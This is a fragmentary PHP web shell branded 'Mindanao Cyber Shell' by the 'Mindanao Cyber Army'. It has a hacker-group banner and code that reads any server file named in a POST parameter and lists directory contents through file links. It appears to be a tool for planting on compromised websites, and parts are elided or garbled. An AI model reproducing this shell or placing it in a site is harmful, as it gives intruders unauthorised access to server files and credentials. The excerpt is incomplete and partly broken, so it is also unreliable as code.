...
<head>
<link rel="shortcut icon" href="https://c.top4top.io/p_2613gav302.png" type="image/jpg"> 
<body bgcolor="black"><center>
	


<link href="" rel="stylesheet" type="text/json_decode">
<title>Mindanao Cyber Army</title>
<style>
...
<body>
     <center><br><br>
    	<a href="<?=$_SERVER['PHP_SELF'];?>">< border='0' alt="Mindanao" ='https://f.top4top.io/p_26224xkl42.png' height='290' width='300'></a>
      </center>
   <h3><font color="white">Philippines Cyber Alliance - Mindanao Cyber Army</h3>
    <div class="greetings">
  <!!!--<a href="<?=$_SERVER['PHP_SELF'];?>">Mindanao Cyber Shell</a>
 </div><br>
       <br><br>
...
echo '
<textarea cols=80 class="textarea" rows=20 name="">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
...
echo '<tr>
<td><a href="?file='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
